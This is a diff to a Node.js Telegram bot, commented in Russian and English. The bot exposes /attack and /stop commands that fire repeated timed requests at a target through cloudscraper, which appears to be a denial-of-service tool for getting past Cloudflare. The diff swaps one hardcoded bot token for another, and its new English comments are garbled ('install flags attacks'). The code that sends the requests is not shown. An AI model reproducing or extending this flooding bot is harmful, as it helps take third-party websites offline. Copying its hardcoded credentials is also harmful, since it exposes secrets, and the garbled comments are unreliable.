@@ -2,12 +2,12 @@ const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const CloudScraper = require('cloudscraper');
 
-// Замените 'YOUR_TELEGRAM_BOT_TOKEN' на фактический токен вашего бота, полученный от BotFather
-const botToken = '6344256672:AAGy5JpT0dTlom0562o3MgO1G-cm54MtAtQ';
+// token
+const botToken = '8550070966:AAEc1cDWjFHXgkBlYCGBY0KaXYtb330soOc';
 const bot = new TelegramBot(botToken, { polling: true });
 
 let attackInterval = null;
-let isAttackStarted = false; // Флаг, указывающий, была ли уже запущена атака
+let isAttackStarted = false; // flags attacks
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
@@ -59,11 +59,11 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
   }
 
   attackInterval = setInterval(sendReq, 1000);
-  isAttackStarted = true; // Устанавливаем флаг, что атака запущена
+  isAttackStarted = true; // install flags attacks
 
   setTimeout(() => {
     clearInterval(attackInterval);
-    isAttackStarted = false; // Сбрасываем флаг после окончания атаки
+    isAttackStarted = false; // retry flags started false
     const message = 'Атака завершена.';
     bot.sendMessage(chatId, message);
   }, time * 1000);
@@ -107,7 +107,7 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
 bot.onText(/\/stop/, (msg) => {
   const chatId = msg.chat.id;
   clearInterval(attackInterval);
-  isAttackStarted = false; // Сбрасываем флаг при остановке атаки
+  isAttackStarted = false; // retry flags stop attacks
   const message = 'Атака остановлена.';
   bot.sendMessage(chatId, message);
 });
